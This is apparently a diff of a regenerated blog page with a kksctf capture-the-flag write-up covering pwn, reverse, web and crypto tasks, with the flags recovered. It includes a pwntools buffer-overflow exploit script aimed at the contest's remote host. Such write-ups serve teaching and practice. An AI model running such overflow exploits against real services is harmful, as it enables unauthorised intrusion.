+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">print_flag</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *stream; <span class="comment">// [esp+8h] [ebp-30h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+Fh] [ebp-29h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Thank you! you can have your flag: &quot;</span>);</span><br><span class="line">  stream = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( stream )</span><br><span class="line">  &#123;</span><br><span class="line">    fgets(&amp;s, <span class="number">29</span>, stream);</span><br><span class="line">    <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">    fclose(stream);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;flag not found&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>So our target is to input something to overflow the <code>v5</code> variable. According to main func, we know that <code>s</code> variable is in <code>[ebp-114h]</code>, and <code>v5</code> variable is in <code>[ebp-10h]</code>, so their distance is 0x104. Main func use <code>fgets</code> func to get our input, and it has length limitation(0x108), therefore our payload will be <code>&#39;a&#39;*0x104 + &#39;aa&#39;</code>, then the <code>v5</code> variable will be 0xCAFE6161. So the last exploit is:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># for kksctf-insane_pwn</span></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">sh = remote(<span class="string">"tasks.open.kksctf.ru"</span>, <span class="number">10003</span>)</span><br><span class="line"><span class="comment">#sh = process("./insane_pwn")</span></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x104</span> + <span class="string">"aa"</span></span><br><span class="line">sh.recvuntil(<span class="string">"Can you lead me to segmentation fault please?"</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># for kksctf-insane_pwn</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">sh = remote(<span class="string">&quot;tasks.open.kksctf.ru&quot;</span>, <span class="number">10003</span>)</span><br><span class="line"><span class="comment">#sh = process(&quot;./insane_pwn&quot;)</span></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x104</span> + <span class="string">&quot;aa&quot;</span></span><br><span class="line">sh.recvuntil(<span class="string">&quot;Can you lead me to segmentation fault please?&quot;</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 
 <p>And the result is:</p>
-<p><img src="//spwpun.github.io/2019/12/30/kksctf-writeup/flag.png" alt="flag"></p>
+<p><img src="/2019/12/30/kksctf-writeup/flag.png" alt="flag"></p>
 <ul>
 <li><strong>flag</strong>: kks{W0w_th15_w@5_4w350m3}</li>
 </ul>
-<h3 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h3><h4 id="Buffalo-reverse"><a href="#Buffalo-reverse" class="headerlink" title="Buffalo reverse"></a>Buffalo reverse</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-94h]</span></span><br><span class="line">  <span class="keyword">char</span> v5[<span class="number">32</span>]; <span class="comment">// [rsp+10h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">104</span>]; <span class="comment">// [rsp+30h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+98h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Please, enter password for decryption: "</span>, argv, envp);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%s"</span>, s);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(s) == <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Decrypting, please wait..."</span>);</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">17</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v5[i] = crypto_data[i] ^ s[i % <span class="number">8</span>];</span><br><span class="line">      <span class="built_in">printf</span>(</span><br><span class="line">        <span class="string">"0x%02x ^ 0x%02x = 0x%02x %c\n"</span>,</span><br><span class="line">        crypto_data[i],</span><br><span class="line">        (<span class="keyword">unsigned</span> __int8)s[i % <span class="number">8</span>],</span><br><span class="line">        (<span class="keyword">unsigned</span> __int8)v5[i],</span><br><span class="line">        (<span class="keyword">unsigned</span> __int8)v5[i]);</span><br><span class="line">      sleep(<span class="number">1u</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Your flag is: %s\n"</span>, v5);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Password don't match."</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h3><h4 id="Buffalo-reverse"><a href="#Buffalo-reverse" class="headerlink" title="Buffalo reverse"></a>Buffalo reverse</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-94h]</span></span><br><span class="line">  <span class="keyword">char</span> v5[<span class="number">32</span>]; <span class="comment">// [rsp+10h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">104</span>]; <span class="comment">// [rsp+30h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+98h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please, enter password for decryption: &quot;</span>, argv, envp);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(s) == <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Decrypting, please wait...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">17</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v5[i] = crypto_data[i] ^ s[i % <span class="number">8</span>];</span><br><span class="line">      <span class="built_in">printf</span>(</span><br><span class="line">        <span class="string">&quot;0x%02x ^ 0x%02x = 0x%02x %c\n&quot;</span>,</span><br><span class="line">        crypto_data[i],</span><br><span class="line">        (<span class="keyword">unsigned</span> __int8)s[i % <span class="number">8</span>],</span><br><span class="line">        (<span class="keyword">unsigned</span> __int8)v5[i],</span><br><span class="line">        (<span class="keyword">unsigned</span> __int8)v5[i]);</span><br><span class="line">      sleep(<span class="number">1u</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Your flag is: %s\n&quot;</span>, v5);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Password don&#x27;t match.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>Easy to understand, it’s xor decrypt. But the password needs us to brute, the description said the flag is embeed with brackets, so we can guess the last character is “}”, because the key length is 8, so we can expand and then know the flag is like “<code>*l*******b*******}</code>“, we can guess the first 5 characters are “<code>flag{</code>“, so the flag is like “<code>flag{***_brut***e}</code>“, but then we couldn’t get more, and now we know the key is “deadb***”. At last we need to read the description again, it said:</p>
+<p>Easy to understand, it’s xor decrypt. But the password needs us to brute, the description said the flag is embeed with brackets, so we can guess the last character is “}”, because the key length is 8, so we can expand and then know the flag is like “<code>*l*******b*******&#125;</code>“, we can guess the first 5 characters are “<code>flag&#123;</code>“, so the flag is like “<code>flag&#123;***_brut***e&#125;</code>“, but then we couldn’t get more, and now we know the key is “deadb***”. At last we need to read the description again, it said:</p>
 <blockquote>
 <p>Buffalo dead while reversing this task.</p>
 </blockquote>
 <p>there is a brainfuck idea: dead buffalo, so the key is “deadbeef”, and that’s an interesting value.</p>
 <p>So the flag:</p>
-<p><img src="//spwpun.github.io/2019/12/30/kksctf-writeup/TIM%E6%88%AA%E5%9B%BE20191228175539.png" alt="TIM截图20191228175539"></p>
+<p><img src="/2019/12/30/kksctf-writeup/TIM%E6%88%AA%E5%9B%BE20191228175539.png" alt="TIM截图20191228175539"></p>
 <h4 id="Xmas-Tree-2"><a href="#Xmas-Tree-2" class="headerlink" title="Xmas Tree 2"></a>Xmas Tree 2</h4><p>It gives us the source code, and it get a value from argv[1], that’s the main function’s first parameter. And then check the value with 5 <code>if</code> conditions, if all are right, then print the flag through decoding.</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> data_1[<span class="number">20</span>] = <span class="string">"_a"</span><span class="string">"cd"</span><span class="string">"eh"</span><span class="string">"ik"</span><span class="string">"lm"</span><span class="string">"no"</span><span class="string">"pr"</span><span class="string">"su"</span><span class="string">"wy"</span><span class="string">"\0"</span>;</span><br><span class="line">	<span class="keyword">if</span> (argc &lt; <span class="number">2</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">int</span> key = atoi (argv[<span class="number">1</span>]);</span><br><span class="line">	<span class="keyword">if</span> (((<span class="keyword">unsigned</span> <span class="keyword">char</span>*)&amp;key)[<span class="number">0</span>] == <span class="number">0xAF</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (((<span class="keyword">short</span>*)&amp;key)[<span class="number">1</span>] == <span class="number">0x3174</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span> (((key &gt;&gt; <span class="number">22</span>) &amp; <span class="number">0xFF</span>) == <span class="number">0xC5</span>) &#123;</span><br><span class="line">				<span class="keyword">if</span> (*(((<span class="keyword">char</span>*)((&amp;key) + <span class="number">2</span>)) - <span class="number">7</span>) == <span class="number">0x19</span>) &#123;</span><br><span class="line">					<span class="keyword">if</span> (((((<span class="keyword">short</span>*)(((<span class="keyword">char</span>*)(&amp;key)) + <span class="number">13</span>) - <span class="number">5</span>)[<span class="number">0</span>] &gt;&gt; <span class="number">0</span>) &amp; <span class="number">0xff</span>) == <span class="number">0x31</span>) &#123;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> data_1[<span class="number">20</span>] = <span class="string">&quot;_a&quot;</span><span class="string">&quot;cd&quot;</span><span class="string">&quot;eh&quot;</span><span class="string">&quot;ik&quot;</span><span class="string">&quot;lm&quot;</span><span class="string">&quot;no&quot;</span><span class="string">&quot;pr&quot;</span><span class="string">&quot;su&quot;</span><span class="string">&quot;wy&quot;</span><span class="string">&quot;\0&quot;</span>;</span><br><span class="line">	<span class="keyword">if</span> (argc &lt; <span class="number">2</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">int</span> key = atoi (argv[<span class="number">1</span>]);</span><br><span class="line">	<span class="keyword">if</span> (((<span class="keyword">unsigned</span> <span class="keyword">char</span>*)&amp;key)[<span class="number">0</span>] == <span class="number">0xAF</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (((<span class="keyword">short</span>*)&amp;key)[<span class="number">1</span>] == <span class="number">0x3174</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span> (((key &gt;&gt; <span class="number">22</span>) &amp; <span class="number">0xFF</span>) == <span class="number">0xC5</span>) &#123;</span><br><span class="line">				<span class="keyword">if</span> (*(((<span class="keyword">char</span>*)((&amp;key) + <span class="number">2</span>)) - <span class="number">7</span>) == <span class="number">0x19</span>) &#123;</span><br><span class="line">					<span class="keyword">if</span> (((((<span class="keyword">short</span>*)(((<span class="keyword">char</span>*)(&amp;key)) + <span class="number">13</span>) - <span class="number">5</span>)[<span class="number">0</span>] &gt;&gt; <span class="number">0</span>) &amp; <span class="number">0xff</span>) == <span class="number">0x31</span>) &#123;</span><br></pre></td></tr></table></figure>
 
 <p>It’s easy to get the value from these 5 <code>if</code> conditions, the first byte is <code>0xAF</code>, and the last 2 bytes’ value is <code>0x3174</code>, the second byte is <code>0x19</code>, and it’s little endian code, so the value is <code>0x317419AF</code>, this value moves to right in 22 bits, also satisfy the third codition <code>0xC5</code>, the last condition mean the last byte is <code>0x31</code>, I seems like that:</p>
-<p><img src="//spwpun.github.io/2019/12/30/kksctf-writeup/IMG_20200103_211413.jpg" alt="IMG_20200103_211413"></p>
+<p><img src="/2019/12/30/kksctf-writeup/IMG_20200103_211413.jpg" alt="IMG_20200103_211413"></p>
 <p>And finally, <code>0x317419AF</code> convert to decimal is <code>829692335</code>, the flag is:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ gcc task_tree.c</span><br><span class="line"></span><br><span class="line">name@Desktop /cygdrive/e/kksctf/reverse/Xmas Tree 2</span><br><span class="line">$ ./a.exe 829692335</span><br><span class="line">kks&#123;c_is_simple_only_when_you_are_drunk&#125;</span><br><span class="line"></span><br><span class="line">name@Desktop /cygdrive/e/kksctf/reverse/Xmas Tree 2</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ gcc task_tree.c</span><br><span class="line"></span><br><span class="line">name@Desktop /cygdrive/e/kksctf/reverse/Xmas Tree 2</span><br><span class="line">$ ./a.exe 829692335</span><br><span class="line">kks&#123;c_is_simple_only_when_you_are_drunk&#125;</span><br><span class="line"></span><br><span class="line">name@Desktop /cygdrive/e/kksctf/reverse/Xmas Tree 2</span><br><span class="line">$</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <ul>
 <li>flag: kks{c_is_simple_only_when_you_are_drunk}</li>
 </ul>
 <h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="Postman"><a href="#Postman" class="headerlink" title="Postman"></a>Postman</h4><p>Find the directory <code>/postbox</code> in robots.txt, then change the method from GET to POST, then you can get the flag.</p>
-<p><img src="//spwpun.github.io/2019/12/30/kksctf-writeup/flag1.png" alt="flag"></p>
+<p><img src="/2019/12/30/kksctf-writeup/flag1.png" alt="flag"></p>
 <ul>
 <li>flag: kks{thanks_f0r_m@1l}</li>
 </ul>
 <h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="Every-day-I’m-shuffling"><a href="#Every-day-I’m-shuffling" class="headerlink" title="Every day I’m shuffling"></a>Every day I’m shuffling</h4><p>I didn’t solved this chall because I used python2 to reverse it, then I can’t find the seed. You should use python3 and linux to reverse it, because some byte code way’s diffenert. The last <code>solve.py</code> is:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin python3</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="comment"># For kksctf-shufflout.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Shuffle</span><span class="params">(p, data)</span>:</span></span><br><span class="line">    buf = list(data)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(data)):</span><br><span class="line">        buf[i] = data[p[i]]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(buf)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reverse_index</span><span class="params">(p)</span>:</span></span><br><span class="line">    ans = [<span class="number">-1</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(len(p))]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(p)):</span><br><span class="line">        ans[p[i]] = i</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    file_name = <span class="string">"message_from_above"</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">19</span>):</span><br><span class="line">        seed(i)</span><br><span class="line">        file_name_list = list(file_name)</span><br><span class="line">        shuffle(file_name_list)</span><br><span class="line">        shuffle_name = <span class="string">''</span>.join(file_name_list)</span><br><span class="line">        <span class="keyword">if</span> shuffle_name == <span class="string">"fsegovs_meaoerbma_"</span>:</span><br><span class="line">            <span class="keyword">print</span> (<span class="string">"seed:"</span>, i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># The above show the seed is 3</span></span><br><span class="line">    data = open(<span class="string">'fsegovs_meaoerbma_.txt'</span>, <span class="string">'r'</span>).read()</span><br><span class="line">    p = list(range(len(data))) <span class="comment"># get the same permuation</span></span><br><span class="line">    shuffle(p)</span><br><span class="line">    p = reverse_index(p)</span><br><span class="line">    data = Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,data))))))))))))))))))))))))))))))))))))))))</span><br><span class="line">    out = open(<span class="string">'origin.txt'</span>, <span class="string">'w'</span>)</span><br><span class="line">    out.write(<span class="string">''</span>.join(data))</span><br><span class="line">    out.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin python3</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="comment"># For kksctf-shufflout.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Shuffle</span>(<span class="params">p, data</span>):</span></span><br><span class="line">    buf = <span class="built_in">list</span>(data)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">        buf[i] = data[p[i]]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(buf)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reverse_index</span>(<span class="params">p</span>):</span></span><br><span class="line">    ans = [<span class="number">-1</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(p))]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(p)):</span><br><span class="line">        ans[p[i]] = i</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    file_name = <span class="string">&quot;message_from_above&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">19</span>):</span><br><span class="line">        seed(i)</span><br><span class="line">        file_name_list = <span class="built_in">list</span>(file_name)</span><br><span class="line">        shuffle(file_name_list)</span><br><span class="line">        shuffle_name = <span class="string">&#x27;&#x27;</span>.join(file_name_list)</span><br><span class="line">        <span class="keyword">if</span> shuffle_name == <span class="string">&quot;fsegovs_meaoerbma_&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;seed:&quot;</span>, i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># The above show the seed is 3</span></span><br><span class="line">    data = <span class="built_in">open</span>(<span class="string">&#x27;fsegovs_meaoerbma_.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">    p = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="built_in">len</span>(data))) <span class="comment"># get the same permuation</span></span><br><span class="line">    shuffle(p)</span><br><span class="line">    p = reverse_index(p)</span><br><span class="line">    data = Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,data))))))))))))))))))))))))))))))))))))))))</span><br><span class="line">    out = <span class="built_in">open</span>(<span class="string">&#x27;origin.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    out.write(<span class="string">&#x27;&#x27;</span>.join(data))</span><br><span class="line">    out.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
 
